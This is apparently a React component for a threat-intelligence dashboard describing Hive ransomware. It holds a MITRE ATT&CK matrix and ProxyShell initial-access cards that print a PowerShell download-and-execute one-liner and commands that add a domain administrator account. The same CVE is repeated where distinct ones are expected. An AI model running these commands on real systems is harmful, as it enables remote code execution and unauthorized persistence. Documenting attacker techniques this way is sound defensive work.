import React from 'react'

type Propx = {
  className: string
}

const Hive: React.FC<Propx> = ({className}) => { 
  return (
	<>
    <div className={`card ${className}`}>
      {/* <div className='card-header border-0 pt-5'>
        <h1 className='card-title fw-bold fs-2qx'>MITRE ATT&CK MATRIX
        </h1>
      </div> */}
        <h1 className='card-title fw-bold fs-2qx pt-6'>MITRE ATT&CK MATRIX
        </h1>
      <div className='card-body pt-3 pb-6'>
        <div className='table-responsive border-start border-end border-white'>
          <table className='table align-baseline gx-1 gy-4 table-striped border border-dark'>
            <thead>
			   <tr className='fs-6 fw-semebold text-white bg-dark text-center'>
				<th className='min-w-175px border-end border-white'>Initial-Access</th>
				<th className='min-w-175px border-end border-white'>Execution</th>
				<th className='min-w-175px border-end border-white'>Persistence</th>
				<th className='min-w-175px border-end border-white'>Privilege-Escalation</th>
				<th className='min-w-175px border-end border-white'>Defense-Evasion</th>
				<th className='min-w-175px border-end border-white'>Credential-Access</th>
				<th className='min-w-175px border-end border-white'>Discovery</th>
				<th className='min-w-175px border-end border-white'>Lateral-Movement</th>
				<th className='min-w-175px border-end border-white'>Command-and-Control</th>
				<th className='min-w-175px border-end border-white'>Impact</th>
              </tr>
            </thead>
            <tbody>
				<tr className=''>              
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-1'>T1190</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>- Exploit Public-Facing Application</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'> 
								<div>- CVE-2021-34473</div>
								<div>- CVE-2021-34473</div>
								<div>- CVE-2021-34473</div>
								</div>
							</div>
						</div>
					</td>
	
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1204.002</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- User Execution: Malicious File
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1136.002</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Create Account: Domain Account
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1078.002</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Valid Account: Domain Accounts
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1140</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Deobfuscate/Decode Files or Information
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1070.001</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Indicator Removal: Clear Windows Event Logs
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1003.005</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- OS Credential Dumping: Cached Domain Credentials
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1018</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Remote System Discovery
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1021.001</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Remote Services: Remote Desktop Protocol
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1071.001</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Application Layer Protocol: Web Protocolse
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
				</tr>							<tr className=''>              
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '>T1486</span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									- Data Encrypted for Impact
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
	
					<td className='border-start border-end border-dark'>
						<div className='px-2 d-flex align-items-baseline'>
							<div className='symbol symbol-50px me-2'>
							<span className='badge badge-secondary fs-8 fw-bold '></span>
							</div>
							<div className='d-flex justify-content-baseline flex-column'>
								<div className='text-dark fw-semibold mb-1 fs-7'>
									
								</div>
								<div className='text-muted fw-semibold text-muted d-block fs-7'>

								</div>
							</div>
						</div>
					</td>
				</tr>            </tbody>
          </table>
        </div>
      </div>
    </div>

	<div className='fs-1 fw-bold text-dark pt-6 ps-3'>Initial-Access</div>
	<div className='row g-5 g-xl-8 pt-4'>
        <div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
     			{/* begin::Header */}
    		    <div className='card-header align-items-center border-0 mt-4'>
        			{/* <div className='card-title align-items-start flex-column'>
          				<span className='fw-bold text-dark fs-1 '>Initial-Access</span>
        			</div> */}
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Exploit Public-Facing Application</span>
					</div>	
				</div>
				{/* end::Header */}

				{/* begin::Body */}
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>ProxyShell involves a set of three separate security flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
	  					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
	  						<div>&deg;&nbsp;CVE-2021-34473</div>
							<div>&deg;&nbsp;CVE-2021-34473</div>
							<div>&deg;&nbsp;CVE-2021-34473</div>
						</div>
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>Windows</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
	  					<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
	  						<div>&deg;&nbsp;IEX ((new-object net.webclient).downloadstring('$addr'))</div>
							<div>&deg;&nbsp;net user "user" "#password" /add /domain</div>
							<div>&deg;&nbsp;net group "Administrators" "user" /add /domain</div>
						</div>
					</div>					
					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
					<div className='ms-5 mb-5'>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>AES</span>
						<span>&nbsp;&nbsp;</span>
					</div>
					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.hive</div>
				</div>
				{/* end::Body */}
			</div>
        </div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
     			{/* begin::Header */}
    		    <div className='card-header align-items-center border-0 mt-4'>
        			{/* <div className='card-title align-items-start flex-column'>
          				<span className='fw-bold text-dark fs-1 '>Initial-Access</span>
        			</div> */}
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Exploit Public-Facing Application</span>
					</div>	
				</div>
				{/* end::Header */}

				{/* begin::Body */}
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>ProxyShell involves a set of three separate security flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
	  					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
	  						<div>&deg;&nbsp;CVE-2021-34473</div>
							<div>&deg;&nbsp;CVE-2021-34473</div>
							<div>&deg;&nbsp;CVE-2021-34473</div>
						</div>
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>Windows</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
	  					<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
	  						<div>&deg;&nbsp;IEX ((new-object net.webclient).downloadstring('$addr'))</div>
							<div>&deg;&nbsp;net user "user" "#password" /add /domain</div>
							<div>&deg;&nbsp;net group "Administrators" "user" /add /domain</div>
						</div>
					</div>					
					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
					<div className='ms-5 mb-5'>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
						<span>&nbsp;&nbsp;</span>
						<span className='badge badge-light-info fs-7 fw-bold my-2'>AES</span>
						<span>&nbsp;&nbsp;</span>
					</div>
					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.hive</div>
				</div>
				{/* end::Body */}
			</div>
        </div>

      </div>
	</>
  )
}

export {Hive}
